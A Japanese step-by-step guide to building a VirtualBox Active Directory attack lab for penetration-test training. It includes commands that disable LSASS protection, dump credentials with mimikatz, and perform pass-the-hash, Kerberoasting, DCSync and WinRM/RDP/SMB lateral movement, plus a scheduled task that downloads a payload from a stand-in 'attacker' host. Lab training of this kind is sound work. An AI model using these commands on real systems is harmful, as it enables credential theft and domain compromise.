# VirtualBox + Windows 11 対応  
# keda-lab（AD / TLPT 攻撃ラボ）構築手順書  
**どのイメージ（DC01 / WIN11 / KALI）でコマンドを叩くか明示版**  
**ISO 入手方法も明記**

（本文内で使うコードはすべて `~~~~` ～ `~~~~` を使用）

---

# 0. 使用する OS イメージ（ISO）と入手方法

## ● 1. Windows Server 2019 評価版（keda-DC01 / keda-ADFS01）
入手サイト（Microsoft公式）：  
https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019

選択肢：ISO

VM 名：
~~~~
keda-DC01
keda-ADFS01（任意）
~~~~

---

## ● 2. Windows 11 Enterprise 評価版（keda-WIN11）
入手サイト：  
https://www.microsoft.com/en-us/evalcenter/evaluate-windows-11-enterprise

選択肢：ISO

VM 名：
~~~~
keda-WIN11
~~~~

---

## ● 3. Kali Linux（攻撃端末：keda-KALI）
入手サイト（公式）：  
https://www.kali.org/get-kali/

選択肢：Installer ISO

VM 名：
~~~~
keda-KALI
~~~~

---

# 1. VirtualBox NAT ネットワーク

~~~~
Name: keda-NAT
Network: 192.168.100.0/24
DHCP: OFF
~~~~

VM の固定 IP：

~~~~
keda-DC01     192.168.100.10
keda-ADFS01   192.168.100.11（任意）
keda-WIN11    192.168.100.20
keda-KALI     192.168.100.30
~~~~

---

# 2. keda-DC01（Windows Server 2019）の構築  
**※ 以下のコマンドはすべて “keda-DC01” で実行する**

## AD DS インストール（keda-DC01）

~~~~
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
~~~~

## ドメイン構築（keda-DC01）

~~~~
Install-ADDSForest -DomainName "keda.local"
~~~~

再起動すれば DC 完成。

---

# 3. keda-WIN11（Windows 11）の構築  
**※ 以下はすべて “keda-WIN11” の中で行う**

## IP 固定（keda-WIN11）

~~~~
IP:   192.168.100.20
Mask: 255.255.255.0
GW:   192.168.100.1
DNS:  192.168.100.10
~~~~

## LSASS 保護 OFF（Credential Dumping用）

~~~~
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
~~~~

## ドメイン参加（keda-WIN11 → keda.local）

GUI で参加。

---

# 4. testuser 作成（keda-DC01）  
**※ このコマンドは “keda-DC01” で実行**

~~~~
New-ADUser -Name "keda-user" -SamAccountName "keda-user" `
  -AccountPassword (ConvertTo-SecureString "KedaPassword123!" -AsPlainText -Force) `
  -Enabled $true
~~~~

---

# 5. keda-KALI（Kali Linux 攻撃端末）構築  
**※ 以下はすべて “keda-KALI” の中で行う**

## ツールインストール（keda-KALI）

~~~~
sudo apt update
sudo apt install impacket-scripts kerbrute evil-winrm -y
~~~~

---

# 6. LDAP / Kerberos 動作確認  
**どの端末でコマンドを叩くかを明記**

## LDAP Bind  
**※ 実行端末：keda-KALI**

~~~~
ldapsearch -x -H ldap://192.168.100.10 -D "keda.local\keda-user" -w KedaPassword123!
~~~~

## Kerberos（kinit / klist）  
**※ 実行端末：keda-KALI**

~~~~
kinit keda-user@KEDA.LOCAL
klist
~~~~

---

# 7. Credential Dumping（LSASS ダンプ）  
**※ 実行端末：keda-WIN11（管理者権限）**

mimikatz：

~~~~
privilege::debug
sekurlsa::logonpasswords
~~~~

---

# 8. Pass-the-Hash  
**※ コマンド実行端末：keda-KALI**

~~~~
pth-winexe -U 'keda.local/keda-user%NTLMHASH' //192.168.100.20 cmd
~~~~

---

# 9. Kerberoasting  
**※ 実行端末：keda-KALI**

~~~~
GetUserSPNs.py keda.local/keda-user:KedaPassword123! -dc-ip 192.168.100.10
~~~~

---

# 10. DCSync（ドメイン支配）  
**※ 実行端末：keda-DC01 または DA権限を取った任意マシン**

mimikatz：

~~~~
lsadump::dcsync /domain:keda.local /user:krbtgt
~~~~

---

# 11. AzureAD + MFA（無料）  
**※ 全作業は “ブラウザ” のみで完結（端末は問わない）**

~~~~
1. Microsoft 365 Developer に登録
2. AzureAD → Users → 新規作成
3. Security → MFA → 有効化
4. JWT を https://jwt.ms で解析
~~~~

---

# 12. keda-ADFS01（任意：SAMLラボ）  
**実行端末：keda-ADFS01（Windows Server 2019）**

~~~~
Install-WindowsFeature ADFS-Federation -IncludeManagementTools
~~~~

SAML署名・トークン解析が可能になる。

---

# 13. Lateral Movement（横展開）

## WinRM  
**※ 実行端末：keda-KALI**

~~~~
evil-winrm -i 192.168.100.20 -u keda-user -p KedaPassword123!
~~~~

## RDP  
**※ 実行端末：keda-KALI**

~~~~
xfreerdp /u:keda-user /p:KedaPassword123! /v:192.168.100.20
~~~~

## SMB  
**※ 実行端末：keda-KALI**

~~~~
smbclient -L //192.168.100.20 -U keda-user
~~~~

---

# 14. Loader（安全な模倣）  
**※ 実行端末：keda-WIN11**

~~~~
schtasks /create /sc minute /mo 5 /tn "keda-updater" /tr "powershell.exe -c wget http://attacker/payload.ps1 -o C:\keda-loader.ps1"
~~~~

---

# 15. Stealer（RedLine / Raccoon / Vidar）

~~~~
実行は禁止。  
ダミーの JSON ログのみ解析して「Valid Accounts 侵入」の流れを理解する。
~~~~

---

# まとめ：どの端末で何を実行するか一覧

| 機能 | 実行端末 |
|------|-----------|
| AD構築 | keda-DC01 |
| ドメイン参加 | keda-WIN11 |
| LSASS保護解除 | keda-WIN11 |
| LDAP Bind | keda-KALI |
| Kerberos（kinit） | keda-KALI |
| Credential Dumping | keda-WIN11 |
| Pass-the-Hash | keda-KALI |
| Kerberoasting | keda-KALI |
| DCSync | keda-DC01 または DA権限マシン |
| WinRM/RDP/SMB 横展開 | keda-KALI |
| Loader模倣 | keda-WIN11 |
| AzureAD/MFA | ブラウザ（任意端末） |
| ADFS構築 | keda-ADFS01（任意） |

この一覧を見れば「どのVMで何を実行するか」が一目で分かる。